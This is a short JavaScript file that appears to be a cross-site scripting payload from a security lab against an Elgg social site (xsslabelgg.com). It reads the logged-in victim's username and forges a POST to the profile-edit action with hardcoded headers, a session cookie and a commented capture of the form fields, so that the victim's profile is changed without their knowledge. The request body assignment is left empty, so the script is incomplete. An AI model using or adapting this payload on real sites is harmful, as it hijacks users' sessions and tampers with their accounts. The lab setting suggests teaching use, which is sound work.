'use strict';

let Ajax = null;
let username = elgg.session.user.username;

// Content-Length: 484
// *__elgg_token=e14473d4037a91b83100066cf70b8dce
//  &__elgg_ts=1508444117
//  &name=Boby
//  &description=
//  &accesslevel%5Bdescription%5D=2
//  &briefdescription=dhdfei
//  &accesslevel%5Bbriefdescription%5D=2
//  &location=
//  &accesslevel%5Blocation%5D=2
//  &interests=
//  &accesslevel%5Binterests%5D=2
//  &skills=
//  &accesslevel%5Bskills%5D=2
//  &contactemail=
//  &accesslevel%5Bcontactemail%5D=2
//  &phone=
//  &accesslevel%5Bphone%5D=2
//  &mobile=
//  &accesslevel%5Bmobile%5D=2
//  &website=
//  &accesslevel%5Bwebsite%5D=2
//  &twitter=
//  &accesslevel%5Btwitter%5D=2
//  &guid=40
// */

Ajax = new XMLHttpRequest();
Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive", "300");
Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0");
Ajax.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
Ajax.setRequestHeader("Accept-Encoding", "gzip, deflate");
Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/"+username+"/edit");
Ajax.setRequestHeader("Cookie", "Elgg=j6fk84knlhmpkfleu4g0hg9ad5");
Ajax.setRequestHeader("Connection", "keep-alive");
Ajax.setRequestHeader("Upgrade-Insecure-Requests", "1");
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

let content = 
Ajax.setRequestHeader("Content-Length", content.length);
Ajax.send(content);

